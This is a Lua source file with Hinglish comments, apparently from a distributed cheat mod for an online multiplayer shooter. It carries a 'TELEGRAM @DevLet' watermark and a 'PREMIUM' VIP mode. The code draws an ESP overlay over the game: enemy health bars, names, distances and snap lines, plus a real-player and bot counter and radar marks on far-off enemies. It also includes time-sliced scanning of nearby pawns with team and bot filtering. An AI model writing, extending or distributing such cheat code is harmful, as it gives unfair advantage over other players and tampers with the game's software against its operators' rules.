    local dy = R - (prevD + d1) * 0.5                 -- slice ke beech se circle ke center tak
    local inset = R - math.sqrt(math.max(0.0, R * R - dy * dy))
    out[#out + 1] = { d0 = prevD, d1 = d1, inset = inset }
    prevD = d1
  end
  local span = halfW - prevD
  local n = math.max(1, math.ceil(span / (ESP.TILE_SLICE_W or 1.8)))
  local lastD = prevD
  for i = 1, n do
    local d1 = prevD + span * i / n
    out[#out + 1] = { d0 = lastD, d1 = d1, inset = 0 }
    lastD = d1
  end
  return out
end

-- Ek half ke saare parts (gradient slices + icon cells) banata hai
function ESP.TileBuild(rb, side)
  local H     = ESP.TILE_H
  local halfW = H * ESP.TILE_HALF_F
  local R     = H * ESP.TILE_CORNER_F
  local cell  = (H / 22.0) / (ESP.TILE_DESIGN_PPU or 1.6875)    -- 1 icon cell = 1 device pixel (canvas units mein)
  local parts = {}

  -- 1) gradient slices (+ bahar ke corner ka round)
  for _, s in ipairs(ESP.TileBounds(halfW, R)) do
    local t = ((s.d0 + s.d1) * 0.5) / halfW        -- 0 = bahar ki edge, 1 = beech ki seam
    local col
    if side == "Player" then
      col = ESP.TileColor(ESP.TILE_RED_OUT, ESP.TILE_RED_IN, t)
    else
      col = ESP.TileColor(ESP.TILE_GRN_OUT, ESP.TILE_GRN_IN, t)
    end
    parts[#parts + 1] = { ln = ESP.NewLine(col, 1000), kind = "slice",
                          d0 = s.d0, d1 = s.d1, inset = s.inset }
  end

  -- 2) icon cells (white, alpha shades)
  local ic = (side == "Player") and ESP.ICON_SOLDIER or ESP.ICON_ROBOT
  local alphaTbl = ESP.TILE_ICON_ALPHA
  for _, c in ipairs(ic.r) do
    local col = ESPMKC(1.0, 1.0, 1.0, alphaTbl[c[5]] or 1.0)
    parts[#parts + 1] = { ln = ESP.NewLine(col, 1003), kind = "cell",
                          rx1 = (ic.ox + c[1]) * cell, ry1 = (ic.oy + c[2]) * cell,
                          rx2 = (ic.ox + c[3]) * cell, ry2 = (ic.oy + c[4]) * cell }
  end

  rb.Parts[side] = parts
end

function ESP.RibbonCreate()
  local canvas = ESP.GetCanvas()
  if not ESPValid(canvas) then return nil end

  local fs = ESP.TileFontSize()
  local function mkTxt(defaultTxt)
    local tb, slot = nil, nil
    pcall(function() tb = CGame:NewObjectFromPath("/Script/UMG.TextBlock", canvas) end)
    if not ESPValid(tb) then return nil, nil end
    pcall(function()
      tb:SetText(defaultTxt or "0")
      tb:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
      if tb.SetJustification then tb:SetJustification(1) end  -- center
      slot = canvas:AddChildToCanvas(tb)
      if slot then
        slot:SetAutoSize(true)
        slot:SetAlignment(ESPV2(0.5, 0.5))
        slot:SetZOrder(1015)
      end
    end)
    ESP.SetTextColor(tb, TILE_WHITE)
    ESP.SetTileFont(tb, fs)
    return tb, slot
  end

  local rb = {}
  rb.Parts = {}
  rb.TxtPlayer, rb.SlotTxtPlayer = mkTxt("0")    -- player count (red half)
  rb.TxtBot,    rb.SlotTxtBot    = mkTxt("0m")   -- bot count + m (green half)

  if not (rb.SlotTxtPlayer and rb.SlotTxtBot) then
    return nil
  end

  ESP.TileBuild(rb, "Player")
  ESP.TileBuild(rb, "Bot")

  ESP.Ribbon = rb
  return rb
end

-- Bar + icons ko position do (cx = screen center X). Sirf position badalne par chalta hai.
function ESP.TileDraw(rb, cx, topY)
  local H     = ESP.TILE_H
  local halfW = H * ESP.TILE_HALF_F
  local leftX, rightX = cx - halfW, cx + halfW

  local function drawSide(parts, isPlayer)
    if not parts then return end
    local baseX = isPlayer and leftX or cx          -- half ka left edge (icon offsets isse naapte hain)
    for _, p in ipairs(parts) do
      local ln = p.ln
      if ln then
        if p.kind == "slice" then
          local y1, y2 = topY + p.inset, topY + H - p.inset
          if isPlayer then
            ESP.DrawRectF(ln, leftX + p.d0, y1, leftX + p.d1, y2)     -- bahar = left
          else
            ESP.DrawRectF(ln, rightX - p.d1, y1, rightX - p.d0, y2)   -- bahar = right
          end
        else
          ESP.DrawRectF(ln, baseX + p.rx1, topY + p.ry1, baseX + p.rx2, topY + p.ry2)
        end
      end
    end
  end

  drawSide(rb.Parts.Player, true)
  drawSide(rb.Parts.Bot, false)
end

-- cx = screen center X; joined bar + icons + dono text
function ESP.UpdateRibbon(nPlayers, nBots, cx)
  local rb = ESP.Ribbon
  if not _G.GTLMODConfig.Esp9_Count then
    if rb then ESP.RibbonHide() end
    return
  end
  if not rb or not ESP.RibbonOk(rb) then
    if rb then ESP.RibbonDestroy() end
    rb = ESP.RibbonCreate()
    if not rb then return end
  end

  local H     = ESP.TILE_H
  local halfW = H * ESP.TILE_HALF_F
  local topY  = ESP.TILE_TOPY
  cx = RND(cx)

  -- bar + icons: sirf tab dobara lagao jab position badli ho ya hide ke baad wapas dikh raha ho
  -- (pehle har Update par string join "cx:topY:H:ppu" banta tha = 5 temporary strings; ab sirf numbers compare)
  local ppu = ESP.GetPPU()
  if rb.hidden ~= false or rb.gcx ~= cx or rb.gtop ~= topY or rb.gH ~= H or rb.gppu ~= ppu then
    rb.gcx, rb.gtop, rb.gH, rb.gppu = cx, topY, H, ppu
    ESP.TileDraw(rb, cx, topY)
  end

  -- Text positions (digit ka visual center, reference ke anchors par)
  if rb.px ~= cx or rb.py ~= topY then
    rb.px, rb.py = cx, topY
    local fs   = ESP.TileFontSize()
    -- reference mein digit bar ke center se 0.035H upar; HUD font ka digit widget-center se 0.115*size upar baithta hai
    local txtY = topY + H * 0.5 - H * 0.035 + fs * 0.115
    local pTx  = (cx - halfW) + halfW * (ESP.TILE_TXT_RED_X or 0.728)
    local bTx  = cx + halfW * (ESP.TILE_TXT_GRN_X or 0.659)
    pcall(function()
      rb.SlotTxtPlayer:SetPosition(ESPV2(pTx, txtY))
      rb.SlotTxtBot:SetPosition(ESPV2(bTx, txtY))
    end)
  end

  -- Update counts
  if rb.LastP ~= nPlayers then
    rb.LastP = nPlayers
    pcall(function() rb.TxtPlayer:SetText(tostring(nPlayers or 0)) end)
  end
  if rb.LastB ~= nBots then
    rb.LastB = nBots
    -- Bot tile: "0m" style (bots ki ginti + m)
    local botTxt = (nBots and nBots > 0) and (tostring(nBots) .. "m") or "0m"
    pcall(function() rb.TxtBot:SetText(botTxt) end)
  end

  -- Show widgets
  if rb.hidden ~= false then
    rb.hidden = false
    local vis = UEnums.ESlateVisibility.SelfHitTestInvisible
    for _, k in ipairs({ "TxtPlayer", "TxtBot" }) do
      local w = rb[k]
      if ESPValid(w) then pcall(function() w:SetWidgetVisibility(vis) end) end
    end
  end
end

function ESP.CanvasCenterX(viewW)
  local cw = nil
  pcall(function()
    local canvas = ESP.GetCanvas()
    if ESPValid(canvas) then
      local geo = canvas:GetCachedGeometry()
      if geo and geo.GetLocalSize then
        local s = geo:GetLocalSize()
        if s and tonumber(s.X) and s.X > 1 then cw = tonumber(s.X) end
      end
    end
  end)
  if tonumber(cw) and cw > 1 then return cw * 0.5 end
  return (viewW * 0.5) * (ESP.ScaleX or 1.0) + (ESP.OffsetX or 0.0)
end

-- Snap-line origin (top center) return karta hai + flat tile counter update karta hai.
function ESP.UpdateCounter(nPlayers, nBots, pc, viewW)
  local cx = RND(ESP.ScreenCenterX(pc, viewW))
  _G.GTLSafe("ESP.UpdateRibbon", ESP.UpdateRibbon, nPlayers or 0, nBots or 0, cx)
  -- tile ke neeche peela watermark: tile dikh raha ho tabhi dikhta hai (tile ke saath hi chhupta bhi hai)
  local rb = ESP.Ribbon
  if rb and rb.hidden == false then
    _G.GTLSafe("ESP.UpdateWM", ESP.UpdateWM, cx)
  else
    ESP.WMHide()
  end
  -- Lines tile ke bilkul neeche center se shuru
  local oy = CFG.SnapOriginY or 0.0
  if _G.GTLMODConfig.Esp9_Count then
    oy = (ESP.TILE_TOPY or 47) + (ESP.TILE_H or 22) + 3
    -- watermark tile ke neeche dikh raha ho to lines uske bhi neeche se shuru (text ke upar se na guzrein)
    local wm = ESP.WM
    if ESP.WM_LINES_BELOW and wm and wm.hidden == false and wm.bottomY then
      oy = math.max(oy, wm.bottomY + 3)
    end
  end
  -- origin ek hi reused table hai (pehle har Update par naya FVector2D userdata + har line par 2 field reads)
  local o = ESP._origin
  if not o then o = { X = 0, Y = 0 } ESP._origin = o end
  o.X, o.Y = cx, RND(oy)
  return o
end

-- ==============================================================================
-- WATERMARK -- V2 tile ke NEECHE, center mein peela "@DevLet" text
--   (Pehle yahan ESP COUNTER V1 bhi tha: "REAL: n  BOT: n" text counter. Wo poora hata diya gaya,
--    sirf ye peeli line rahi.)
--
--        [ tile: RED | GREEN ]
--          @DevLet        <- peela, chhota
--
--   Tile ke saath hi dikhta aur chhupta hai (EREN ESP COUNTER V2 ON / OFF). Canvas widget hai: screen par
--   fixed jagah. Text/color/font ek hi baar lagte hain; Update par sirf position badalne par engine ko chhoota hai.
-- ==============================================================================
ESP.WM_TEXT        = "TELEGRAM @DevLet"
ESP.WM_FS          = 8      -- font size (units). Caps height ~ 0.986 * size
ESP.WM_GAP         = 3      -- tile ke neeche se gap (units)
ESP.WM_ROW_H       = 10     -- text row ki height (units)
ESP.WM_LINES_BELOW = true   -- snap lines watermark ke neeche se shuru hon (false = tile ke neeche se)

-- Color LINEAR hai (ESPMKC = FLinearColor). sRGB equivalent saath mein likha hai.
function ESP.WMColor()
  local c = ESP._wmc
  if not c then
    c = ESPMKC(1.0000, 0.7529, 0.0612, 0.95)   -- sRGB (255,225, 70)  peela
    ESP._wmc = c
  end
  return c
end

-- Game ka HUD font, patla black outline (kisi bhi background par padha jaye).
function ESP.SetWMFont(w, size)
  if not ESPValid(w) then return end
  pcall(function()
    local f = w.Font
    if not f then return end
    f.Size = size
    pcall(function()
      local o = f.OutlineSettings          -- copy
      if o then
        o.OutlineSize = 1
        pcall(function() o.OutlineColor = ESPMKC(0, 0, 0, 1) end)
        f.OutlineSettings = o              -- wapas assign (SetLabelFont wala tareeqa)
      end
    end)
    w:SetFont(f)
  end)
  pcall(function()
    if w.SetShadowOffset then w:SetShadowOffset(ESPV2(1, 1)) end
    if w.SetShadowColorAndOpacity then w:SetShadowColorAndOpacity(ESPMKC(0, 0, 0, 0.7)) end
  end)
end

function ESP.WMCreate()
  local canvas = ESP.GetCanvas()
  if not ESPValid(canvas) then return nil end
  local tb, slot = nil, nil
  pcall(function() tb = CGame:NewObjectFromPath("/Script/UMG.TextBlock", canvas) end)
  if not ESPValid(tb) then return nil end
  pcall(function()
    tb:SetText(ESP.WM_TEXT)
    tb:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
    if tb.SetJustification then tb:SetJustification(1) end   -- center
    slot = canvas:AddChildToCanvas(tb)
    if slot then
      slot:SetAutoSize(true)
      slot:SetAlignment(ESPV2(0.5, 0.5))
      slot:SetZOrder(1016)
    end
  end)
  if not slot then
    pcall(function() tb:RemoveFromParent() end)
    return nil
  end
  ESP.SetWMFont(tb, ESP.WM_FS)
  ESP.SetTextColor(tb, ESP.WMColor())
  local d = { Widget = tb, Slot = slot, hidden = true }
  ESP.WM = d
  return d
end

function ESP.WMHide()
  local d = ESP.WM
  if d and d.hidden ~= true then ESP.Hide(d) end
end

function ESP.WMDestroy()
  ESP.Destroy(ESP.WM)
  ESP.WM = nil
end

-- cx = screen center X (tile wala hi). ESP.UpdateCounter se, tile dikh raha ho tab.
function ESP.UpdateWM(cx)
  local d = ESP.WM
  if not (d and ESP.WOk(d)) then
    if d then ESP.WMDestroy() end
    d = ESP.WMCreate()
    if not d then return end
  end
  local fs   = ESP.WM_FS or 8
  local rowH = ESP.WM_ROW_H or 10
  local top  = (ESP.TILE_TOPY or 47) + (ESP.TILE_H or 22) + (ESP.WM_GAP or 3)
  -- text widget ka center = visual center + 0.115*size (HUD font: caps widget-center se upar baithte hain)
  local x = RND(cx)
  local y = RND(top + rowH * 0.5 + fs * 0.115)
  if d.hidden or d.px ~= x or d.py ~= y then
    pcall(H.pos, d.Slot, x, y)
    d.px, d.py = x, y
  end
  if d.hidden then
    pcall(H.vis, d.Widget, UEnums.ESlateVisibility.SelfHitTestInvisible)
    d.hidden = false
  end
  d.bottomY = top + rowH            -- snap lines is se neeche se shuru hoti hain (UpdateCounter)
end

function ESP.EnsureHealthBg(key)
  local d = ESP.HealthBg[key]
  if d and ESP.WOk(d) then return d end
  -- 2nd ss jaisa: very dark semi-transparent bg (barely visible underlay)
  d = ESP.NewLine(ESPMKC(0.0, 0.0, 0.0, 0.55), 31)
  ESP.HealthBg[key] = d
  ESP.Known[key] = true
  return d
end

function ESP.EnsureHealthFill(key)
  local d = ESP.HealthFill[key]
  if d and ESP.WOk(d) then return d end
  -- reference jaisa: halka dark green fill (HealthColor mein ek hi jagah se color aata hai)
  d = ESP.NewLine(HealthColor(1.0), 32)
  if d then d.colorKey = "hp" end            -- color pehle se lagi hai (UpdateHealthBar dobara na lagaye)
  ESP.HealthFill[key] = d
  ESP.Known[key] = true
  return d
end

-- [v5.4] Health bar -- 2nd screenshot EXACT style:
--   * Thin bar (4px height) -- pati jesi, compact
--   * Width = enemy box width (boxL to boxR), clamped 20-100
--   * Position: sir ke bilkul upar (2px gap only)
--   * Color: always same dark-green (halka sa) -- no color change at low HP
--   * BG: very subtle dark underlay only
function ESP.UpdateHealthBar(key, pct, boxL, boxR, headTopY, isKnocked)
  local bg   = ESP.EnsureHealthBg(key)
  local fill = ESP.EnsureHealthFill(key)
  if not bg or not fill then return end

  -- 2nd ss jaisa: FIXED bar width (door jane par chhota na ho) -- always 60px
  -- [Fix 1] barW screen projection se nahi leni -- woh shrink karti hai door par
  -- Ab fixed 60px, har distance par same size rahega
  local barW = 60
  local barH = 4.5                         -- thin like 2nd screenshot
  local gapAboveHead = 2.0                 -- sir ke bilkul upar (2px only)
  local barTop = headTopY - gapAboveHead - barH
  local boxCenter = (boxL + boxR) * 0.5
  -- bar ko horizontally center karo character ke upar
  boxL = boxCenter - barW * 0.5

  -- Knocked check: agar knocked hai to pct = -1 (red color ke liye)
  local colorPct
  if isKnocked then
    colorPct = -1   -- HealthColor(-1) = red (knocked)
    pct = 1.0       -- bar full dikhao (knocked player ki poori bar red ho)
  else
    pct = tonumber(pct) or 1.0
    if pct < 0 then pct = 0 elseif pct > 1 then pct = 1 end
    colorPct = pct
  end

  -- dark bg underlay (same width as full bar always)
  ESP.DrawHBar(bg, boxL, barTop, barW, barH)

  -- fill -- left anchored, width = barW * pct
  local fw = barW * pct
  if fw < 1 then
    ESP.Hide(fill)
    return
  end
  -- HP % ke hisaab se color change: green/orange/red + knocked = red
  -- colorKey mein pct band (0-3) store karke unnecessary re-set rokein
  local band = isKnocked and "knock" or (colorPct > 0.75 and "g" or (colorPct > 0.25 and "o" or "r"))
  if fill.colorKey ~= band then
    ESP.SetBrush(fill, HealthColor(colorPct), band)
    fill.colorKey = band
  end
  ESP.DrawHBar(fill, boxL, barTop, fw, barH)
end

-- [v4.9] NAME + METER LABEL: canvas TextBlock (ribbon counter jaisa), feet ke neeche, white text
ESP.NameTry = {}
function H.nameAll(c)
  local nm = c.PlayerName or c.PlayerNamePublic or ""
  if (nm == nil or nm == "") and type(c.GetPlayerName) == "function" then nm = c:GetPlayerName() or "" end
  if (nm == nil or nm == "") then
    local ps = c.PlayerState
    if ps then nm = ps.PlayerName or "" end
  end
  return nm
end

-- Naam abhi replicate na hua ho (ya bot ka naam khali ho) to pehle har frame ~6 property reads dohrate the.
-- Ab khali naam par 1 second ruk kar dobara poochte hain; tab tak "Enemy" dikhta hai.
function ESP.GetNameCached(key, c)
  local n = ESP.NameCache[key]
  if n then return n end
  local now = ESP._now or 0
  local nt = ESP.NameTry[key]
  if nt and now < nt and nt - now <= 1.0 then return "Enemy" end
  local nm = ""
  local ok, v = pcall(H.nameAll, c)
  if ok then nm = v end
  nm = tostring(nm or "")
  if nm == "" then
    ESP.NameTry[key] = now + 1.0
    return "Enemy"   -- abhi replicate nahi hua: cache mat karo
  end
  ESP.NameTry[key] = nil
  ESP.NameCache[key] = nm
  return nm
end

function ESP.EnsureLabel(key)
  local d = ESP.Labels[key]
  if d and ESP.WOk(d) then return d end
  local canvas = ESP.GetCanvas()
  if not ESPValid(canvas) then return nil end
  local tb, slot = nil, nil
  pcall(function() tb = CGame:NewObjectFromPath("/Script/UMG.TextBlock", canvas) end)
  if not ESPValid(tb) then return nil end
  pcall(function()
    tb:SetText(" ")
    tb:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
    if tb.SetJustification then tb:SetJustification(1) end
    slot = canvas:AddChildToCanvas(tb)
    if slot then
      slot:SetAutoSize(true)
      slot:SetAlignment(ESPV2(0.5, 0.0))
      slot:SetZOrder(34)
    end
  end)
  if not slot then
    pcall(function() tb:RemoveFromParent() end)
    return nil
  end
  -- 2nd ss jaisa: plain white, compact size, no outline/shadow
  ESP.SetTextColor(tb, C_WHITE)
  ESP.SetLabelFont(tb, 12)
  d = { Widget = tb, Slot = slot, hidden = true, fs = 12 }
  ESP.Labels[key] = d
  ESP.Known[key] = true
  return d
end

-- [v5.3] THIN FONT: Roboto Regular (BID text wala proven tareeka) + outline/shadow SACH MEIN zero.
-- NOTE: SLua nested struct ki COPY deta hai -- f.OutlineSettings.OutlineSize = 0 asli font pe
-- apply hi nahi hota tha. Ab copy nikaal kar badlo aur wapas f.OutlineSettings mein assign karo.
ESP._ThinFont = nil
ESP._ThinFontTried = false
function ESP.GetThinFont()
  if ESP._ThinFontTried then return ESP._ThinFont end
  ESP._ThinFontTried = true
  pcall(function() ESP._ThinFont = slua.loadObject("/Engine/EngineFonts/Roboto.Roboto") end)
  return ESP._ThinFont
end

function ESP.SetLabelFont(w, size)
  if not ESPValid(w) then return end
  pcall(function()
    local f = w.Font
    if not f then return end
    local fo = ESP.GetThinFont()
    if fo then pcall(function() f.FontObject = fo end) end
    pcall(function() f.TypefaceFontName = "Regular" end)
    f.Size = size
    pcall(function()
      local o = f.OutlineSettings          -- copy
      if o then
        o.OutlineSize = 0
        pcall(function() o.OutlineColor = ESPMKC(0, 0, 0, 0) end)
        f.OutlineSettings = o              -- wapas assign: ab asli mein apply hoga
      end
    end)
    w:SetFont(f)
  end)
  pcall(function()
    if w.SetShadowOffset then w:SetShadowOffset(ESPV2(0, 0)) end
    if w.SetShadowColorAndOpacity then w:SetShadowColorAndOpacity(ESPMKC(0, 0, 0, 0)) end
  end)
end

-- Label ko apply karo (text/font/position sirf badalne par -- lag free)
function H.labelApply(d, txt, fs, x, y)
  if d.txt ~= txt then d.Widget:SetText(txt) d.txt = txt end
  if d.fs ~= fs then ESP.SetLabelFont(d.Widget, fs) d.fs = fs end
  local dz = CFG.DeadZone or 0.5
  if d.hidden or d.bx == nil or math.abs(d.bx - x) >= dz or math.abs(d.bt - y) >= dz then
    d.Slot:SetPosition(ESPV2(x, y))
    d.bx, d.bt = x, y
  end
  if d.hidden then
    d.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    d.hidden = false
  end
end

-- Label ko apply karo (text/font/position sirf badalne par -- lag free)
function ESP.SetLabel(key, txt, fs, x, y)
  local d = ESP.EnsureLabel(key)
  if not d or not d.Slot or not ESP.WOk(d) then return end
  pcall(H.labelApply, d, txt, fs, x, y)
end

-- [v5.4] LAYOUT -- 2nd screenshot jaisa compact simple style:
--  * naam line: white, normal weight (jaise "Target" / "ModelTarget")
--  * meter line: white, same font (jaise "3m" / "13m")
--  * font size: distance se adjust -- paas 12, dur 8 (compact, overlap nahi)
--  * no bold, no outline, no shadow -- bilkul plain white text
--  * overlap check: pehle naam+meter, phir sirf meter
ESP.LabelStr = {}
function ESP.LabelFits(placed, np, x, y, em, chars, nlines)
  local w = chars * em * 0.55 + 2
  local h = nlines * em * 1.15
  local x0, y0 = x - w * 0.5, y
  for j = 1, np do
    local pr = placed[j]
    if x0 < pr.x1 and x0 + w > pr.x0 and y0 < pr.y1 and y0 + h > pr.y0 then return nil end
  end
  return x0, w, h
end

function ESP.LayoutLabels(reqs, n)
  local placed = ESP._placed
  if not placed then placed = {} ESP._placed = placed end
  local np = 0
  for i = 1, n do
    local r = reqs[i]
    local dm = math.floor((tonumber(r.dist) or 0) + 0.5)
    -- Font size: 12 (0-30m), 10 (30-80m), 8 (80m+) -- compact like 2nd screenshot
    local fs
    if dm <= 30 then
      fs = 12
    elseif dm <= 80 then
      fs = 10
    else
      fs = 8
    end
    local name = r.name or ""
    -- text strings sirf tab dobara bante hain jab meter ya naam badle (pehle har Update par naya string = garbage)
    local ls = ESP.LabelStr[r.key]
    if not ls then ls = {} ESP.LabelStr[r.key] = ls end
    if ls.dm ~= dm or ls.name ~= name then
      ls.dm, ls.name = dm, name
      local dstr = dm .. "m"
      ls.dstr, ls.dlen = dstr, #dstr
      if name ~= "" then
        ls.both, ls.blen = name .. "\n" .. dstr, math.max(#name, #dstr)
      else
        ls.both, ls.blen = nil, 0
      end
    end
    local x, y = RND(r.x), RND(r.y)
    local em = fs * 1.2                              -- compact spacing
    local txt, x0, w, h
    -- Try naam + meter (2 lines) first
    if name ~= "" then
      x0, w, h = ESP.LabelFits(placed, np, x, y, em, ls.blen, 2)
      if x0 then txt = ls.both end
    end
    -- Fallback: sirf meter (1 line)
    if not txt then
      x0, w, h = ESP.LabelFits(placed, np, x, y, em, ls.dlen, 1)
      if x0 then txt = ls.dstr end
    end
    if txt then
      np = np + 1
      local pr = placed[np]
      if not pr then pr = {} placed[np] = pr end
      pr.x0, pr.x1, pr.y0, pr.y1 = x0, x0 + w, y, y + h
      ESP.SetLabel(r.key, txt, fs, x, y)
    else
      ESP.Hide(ESP.Labels[r.key])
    end
  end
end

function ESP.EnsureSnap(key)
  local d = ESP.Lines[key]
  if d and ESP.WOk(d) then return d end
  -- default color: dark red (visible); frame mein "snap_green" aane par badal jata hai
  d = ESP.NewLine(ESP.SNAP_RED, 30)
  if d then d.colorKey = "snap_red" end        -- color pehle se lagi hai => pehla SetBrush engine ko nahi chhuta
  ESP.Lines[key] = d
  ESP.Known[key] = true
  return d
end

function ESP.HideTarget(key)
  ESP.Hide(ESP.HealthBg[key])
  ESP.Hide(ESP.HealthFill[key])
  ESP.Hide(ESP.Lines[key])
  ESP.Hide(ESP.Labels[key])
end

-- Radar mark turant hatana zaroori hai (dead / door enemy ka mark nahi rehna chahiye)
function ESP.ReleaseMark(key)
  local markData = _G.GTLMODState and _G.GTLMODState.EnemyMarks and _G.GTLMODState.EnemyMarks[key]
  if markData and markData.radarMark and markData.radarMark ~= 0 then
    pcall(SafeRemoveMark, markData.radarMark)
    markData.radarMark = nil
  end
end

-- [v5.5] DIAMOND + METER MARK (9999): "PREMIUM ALL FEATURES ON" (EspVip) ho to enemy ko 360m tak mark lagta hai.
-- MainLoop sirf wahi enemies dekhta hai jo game ki apni list mein hote hain (door wale usme nahi aate), isliye
-- door wale enemies ko yahan EnemyCache (360m filtered) se mark milta hai. Handle EnemyMarks[key].distMark mein hi
-- rehta hai (MainLoop wala hi field) => dono jagah se milkar bhi ek enemy par ek hi mark banta hai.
-- Steady state mein kuch nahi karta (sirf table reads). Mark add fail ho to 0.5 s baad hi dobara try karta hai.
ESP.VIP_MARK_ID = 9999
ESP.VIP_RETRY   = 0.5
function ESP.SyncVipMark(key, c, want, now)
  local ST = _G.GTLMODState
  local marks = ST and ST.EnemyMarks
  if not marks then return end
  local md = marks[key]
  if want then
    if md and md.distMark ~= nil then return end
    if not md then
      md = { enemy = c, lastEnemyActor = c }
      marks[key] = md
    end
    local t = md.vipT
    if t ~= nil and now - t >= 0 and now - t < ESP.VIP_RETRY then return end
    md.vipT = now
    local m = SafeAddMark(ESP.VIP_MARK_ID, FVector(0, 0, 0), 0, "", 4, c)
    if m ~= 0 then md.distMark = m end
  elseif md and md.distMark ~= nil then
    SafeRemoveMark(md.distMark)
    md.distMark = nil
  end
end

-- Widgets destroy + caches saaf
function ESP.ReleaseWidgets(key)
  ESP.Destroy(ESP.HealthBg[key])
  ESP.HealthBg[key] = nil
  ESP.Destroy(ESP.HealthFill[key])
  ESP.HealthFill[key] = nil
  ESP.Destroy(ESP.Lines[key])
  ESP.Lines[key] = nil
  ESP.Destroy(ESP.Labels[key])
  ESP.Labels[key] = nil
  ESP.NameCache[key] = nil
  ESP.NameTry[key] = nil
  ESP.LabelStr[key] = nil
  ESP.VisCache[key] = nil
  ESP.TS[key] = nil
  ESP.ReleaseAt[key] = nil
  ESP.Known[key] = nil
end

function ESP.ReleaseTarget(key)
  ESP.ReleaseMark(key)
  ESP.ReleaseWidgets(key)
end

function ESP.ResetWidgets()
  for _, d in pairs(ESP.Lines) do ESP.Destroy(d) end
  for _, d in pairs(ESP.HealthBg) do ESP.Destroy(d) end
  for _, d in pairs(ESP.HealthFill) do ESP.Destroy(d) end
  for _, d in pairs(ESP.Labels) do ESP.Destroy(d) end
  ESP.Lines = {}
  ESP.HealthBg = {}
  ESP.HealthFill = {}
  ESP.Labels = {}
  ESP.NameCache = {}
  ESP.NameTry = {}
  ESP.LabelStr = {}
  ESP.VisCache = {}
  ESP.TS = {}
  ESP.Known = {}
  ESP.ReleaseAt = {}
  ESP._active = {}
  ESP._seen = {}
  ESP.BotMem = {}
  ESP._sc = nil                  -- chalta hua time-sliced scan band
  ESP._vep = (ESP._vep or 0) + 1 -- saare widget-validity caches expire
  ESP._pc, ESP._cm, ESP._scxT, ESP._camT = nil, nil, nil, nil
  ESP.RibbonDestroy()
  ESP.WMDestroy()
  ESP.Canvas = nil
  ESP.EnemyCache = {}
end

-- ======================= SCAN (time-sliced, distance-first) =======================
-- Pehle poora scan ek hi frame mein hota tha (har pawn par ~20 engine calls => 40-60 pawns par ek bada spike
-- har 0.45 s mein = micro-stutter). Ab:
--   1) pawns ki list ek baar li jati hai,
--   2) har Update mein sirf kuch pawns process hote hain (4 Update mein scan poora),
--   3) pehle distance se reject (sasta), phir alive/team (mehnga) sirf paas wale pawns par,
--   4) bot check key par cache (bot kabhi human nahi banta; "human" natija 1.5 s baad dobara check).
ESP.ScanMinSteps = 6
function H.scanCmp(a, b) return (a.Distance or 99999) < (b.Distance or 99999) end

function ESP.ScanBegin(now)
  local pc = ESP.GetController()
  local me = ESP.GetLocalCharacter()
  local okl, mx, my, mz = false, nil, nil, nil
  if pc and me then okl, mx, my, mz = pcall(H.loc, me) end
  if not pc or not me or not okl or mx == nil then
    ESP.EnemyCache = {}
    ESP.RealCount, ESP.BotCount = 0, 0
    return nil
  end
  local sc = ESP._scS
  if not sc then sc = { pawns = {}, n = 0 } ESP._scS = sc end
  sc.me, sc.mx, sc.my, sc.mz = me, mx, my, mz
  sc.myTeam = ESP.GetTeamID(me)
  local md = CFG.MaxDistance or 40000
  sc.maxSq = md * md
  sc.nReal, sc.nBot = 0, 0
  sc.list = {}
  local list, n = sc.pawns, 0
  local okp, pawns = pcall(H.pawns)
  if okp and pawns then
    for _, ch in pairs(pawns) do n = n + 1 list[n] = ch end
  end
  for i = n + 1, sc.n do list[i] = nil end
  sc.n, sc.i = n, 1
  sc.per = math.max(6, math.ceil(n / (ESP.ScanMinSteps or 6)))
  ESP._sc = sc
  return sc
end

function ESP.ScanFinish(sc)
  local list = sc.list
  table.sort(list, H.scanCmp)
  local trimmed = {}
  -- SMART LAG FIX: total players ke hisab se MaxTracked dynamically adjust hota hai
  -- 20-30 players = event zone lag -- sirf 8 nearest track karo; baaki chho do
  local totalFound = sc.nReal + sc.nBot
  local maxR
  if totalFound >= 25 then
    maxR = 8    -- 25+ players: sirf 8 nearest, full lag-free
  elseif totalFound >= 18 then
    maxR = 10   -- 18-24 players: 10 nearest
  elseif totalFound >= 10 then
    maxR = 12   -- 10-17 players: 12 nearest (CFG se)
  else
    maxR = CFG.MaxTracked or 12  -- normal game: default
  end
  for i = 1, #list do
    if i > maxR then break end
    trimmed[i] = list[i]
  end
  ESP.EnemyCache = trimmed
  ESP.RealCount, ESP.BotCount = sc.nReal, sc.nBot
  local pw = sc.pawns
  for i = 1, sc.n do pw[i] = nil end        -- pawns ke reference mat pakdo
  sc.n, sc.list, sc.me = 0, nil, nil
  ESP._sc = nil
end

function ESP.ScanStep(now)
  local sc = ESP._sc
  if not sc then
    local dt = now - (ESP.LastScan or -999.0)
    if dt >= 0 and dt < (ESP.ScanInterval or 0.35) then return end
    ESP.LastScan = now
    sc = ESP.ScanBegin(now)
    if not sc then return end
  end
  local list, me = sc.pawns, sc.me
  local last = math.min(sc.n, sc.i + sc.per - 1)
  local mx, my, mz, maxSq, myTeam = sc.mx, sc.my, sc.mz, sc.maxSq, sc.myTeam
  local out = sc.list
  for j = sc.i, last do
    local ch = list[j]
    if ch ~= nil and ch ~= me then
      local okl, x, y, z = pcall(H.loc, ch)           -- invalid pawn yahan fail ho jata hai
      if okl and x ~= nil then
        local dx, dy, dz = x - mx, y - my, z - mz
        local dsq = dx * dx + dy * dy + dz * dz
        if dsq <= maxSq and ESP.IsAlive(ch) then       -- IsAlive validity bhi check karta hai
          local team = ESP.GetTeamID(ch, true)
          local same
          if team == myTeam then same = true
          elseif type(team) == type(myTeam) then same = false
          else same = (tostring(team) == tostring(myTeam)) end
          if myTeam == nil or team == nil or not same then
            local key = ESP.GetPlayerKey(ch)
            local bm = ESP.BotMem[key]
            local isBot
            if bm and (bm.b or (now - bm.t >= 0 and now - bm.t < bm.life)) then
              isBot = bm.b
            else
              isBot = ESP.IsBot(ch)
              -- "human" natija 1.5-3.5 s cache (key ke hisab se alag-alag, taake sab pawns ek saath dobara check na hon)
              ESP._bj = ((ESP._bj or 0) * 37 + 17) % 101
              local life = 1.5 + (ESP._bj / 100) * 2.0
              if bm then bm.b, bm.t, bm.life = isBot, now, life
              else ESP.BotMem[key] = { b = isBot, t = now, life = life } end
            end
